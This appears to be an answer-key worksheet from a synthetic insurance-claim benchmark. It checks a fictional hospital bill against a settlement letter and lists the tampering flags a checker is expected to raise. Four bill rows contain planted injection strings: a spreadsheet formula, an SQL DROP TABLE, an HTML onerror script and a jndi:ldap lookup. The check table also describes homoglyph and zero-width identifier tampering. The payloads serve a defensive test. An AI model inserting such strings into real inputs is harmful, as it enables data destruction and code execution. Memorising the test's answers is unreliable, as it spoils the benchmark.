# Worksheet CC_DEV_031

Built from the ClaimClear synthetic dataset's hand-checked answer key (case `CC_DEV_031`, letter `SET-21`); not a separate cross-checker's worksheet.

## Facts from the documents
- Policy AS-2026-101944, Arogya Sanjeevani Policy, Aarohan General Insurance Ltd. (fictional), SI 500,000.00, period 2026-05-01 to 2027-04-30, first inception 2023-05-01, co-pay 5%. Wording UIN GODHLIP24179V022324.
- Claim AGI/HC/2627/007124 at Vrindaloka Memorial Hospital: admitted 2026-07-14, discharged 2026-07-16; letter dated 2026-08-05 (settlement).

## Bill lines (VML/26-27/​003377, Vrindaloka Memorial Hospital)

| # | Item | Qty | Rate | Printed amount | GST % |
|---|---|---:|---:|---:|---:|
| 1 | Semi-private room | 2.0 | 4,200.00 | 8,400.00 | 0 |
| 2 | Nursing and duty doctor charges | 2.0 | 1,100.00 | 2,200.00 | 0 |
| 3 | =HYPERLINK("http://claims.invalid/x","Laboratory investigations") | 1.0 | 4,800.00 | 4,800.00 | 0 |
| 4 | Physician visits'; DROP TABLE claims;-- | 3.0 | 1,200.00 | 3,600.00 | 0 |
| 5 | <img src=x onerror=alert(1)> Pharmacy - inpatient medicines | 1.0 | 4,600.00 | 4,600.00 | 0 |
| 6 | {{7*7}} ${jndi:ldap://claims.invalid/a} IV fluids and nursing procedures | 1.0 | 2,650.00 | 2,650.00 | 0 |
| | **Printed total** | | | **26,250.00** | |

## Comparison with the settlement letter

| Letter row | Amount | Verdict | Correct amount | Why |
|---|---:|---|---:|---|
| (no deduction rows) | | | | |

- Insurer paid: 24,937.50 ; gold payable: 24,937.50 ; difference: 0.00
- Overall: **matches**

## Document checks

| File | Status | What changed | Expected flags |
|---|---|---|---|
| 02_itemised_bill.pdf (ADV-05) | Modified | Details: Patient and Policy No. contain Cyrillic letters, Bill No. a zero-width character. Rows 3-6: formula, SQL, HTML and template strings. Between rows 4-5: decoy total ₹1,95,000. | homoglyph_in_identifier, zero_width_character, csv_formula_payload, sql_payload, html_payload, template_payload, decoy_total_row |
| 01_policy_schedule.pdf (SCH-ADV-05) | Good | Nothing changed. Policy number and name in plain Latin letters; the bill uses look-alikes. | - |
| 03_settlement_letter.pdf (SET-21) | Good | Paid on ₹26,250. Letter has the real policy number and name, without look-alike characters. | - |

## Notes
Matches the policy wording.
